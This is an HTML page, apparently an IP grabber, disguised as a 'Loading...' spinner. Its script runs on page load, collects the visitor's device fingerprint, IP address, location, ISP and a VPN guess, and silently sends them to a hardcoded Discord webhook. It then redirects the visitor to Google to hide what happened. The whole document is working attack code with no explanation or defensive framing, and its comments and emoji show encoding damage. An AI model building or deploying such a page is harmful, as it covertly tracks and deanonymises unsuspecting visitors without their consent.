<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .c { border: 3px solid #111; border-top: 3px solid #0f0; border-radius: 50%; width: 40px; height: 40px; animation: s 1s linear infinite; }
        @keyframes s { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="c"></div>
    <script>
        "use strict";

        const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1457149465688543363/FlP0AtpIk-Yg8NwxGQ1CSdityVf67AL-ODXFlPl9FtQq-tV5j2a9iZmWkGNAUsOHD9uL";

        async function collect() {
            // 1. Temel Veriler
            let info = {
                os: navigator.platform,
                browser: navigator.userAgent.split(' ').pop(),
                res: `${screen.width}x${screen.height}`,
                lang: navigator.language,
                mem: navigator.deviceMemory || "N/A",
                cores: navigator.hardwareConcurrency || "N/A",
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone
            };

            // 2. GPU Tespiti (Raw)
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
            } catch(e) { info.gpu = "Masked"; }

            // 3. IP ve VPN (En HÄ±zlÄ± Servis)
            try {
                const res = await fetch('https://ipapi.co/json/');
                const j = await res.json();
                info.ip = j.ip;
                info.loc = `${j.city} / ${j.country_name}`;
                info.isp = j.org;
                info.is_vpn = (j.timezone !== info.tz) ? "ðŸš¨ YES" : "âœ… NO";
            } catch(e) { info.ip = "Blocked"; }

            // 4. DISCORD PAYLOAD (JSON Format)
            const payload = {
                embeds: [{
                    title: "ðŸ’€ DEVICE DATA EXTRACTED",
                    color: 3066993,
                    fields: [
                        { name: "ðŸ“¡ Network", value: `**IP:** ${info.ip}\n**Loc:** ${info.loc}\n**VPN:** ${info.is_vpn}`, inline: true },
                        { name: "âš™ï¸ System", value: `**OS:** ${info.os}\n**GPU:** ${info.gpu}\n**RAM:** ${info.mem}GB`, inline: false },
                        { name: "ðŸŒ Browser", value: `**TZ:** ${info.tz}\n**Lang:** ${info.lang}\n**Res:** ${info.res}`, inline: true }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            // 5. GÃ–NDERÄ°M (En Garanti YÃ¶ntem: sendBeacon)
            // fetch() bazen CORS hatasÄ± verir ama sendBeacon() tarayÄ±cÄ± seviyesinde gÃ¶nderir.
            const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
            
            if (navigator.sendBeacon) {
                navigator.sendBeacon(WEBHOOK_URL, blob);
            } else {
                // Fallback (Yedek)
                fetch(WEBHOOK_URL, { method: 'POST', mode: 'no-cors', body: blob });
            }

            // 6. YÃ–NLENDÄ°RME
            setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
        }

        window.onload = collect;
    </script>
</body>
</html>
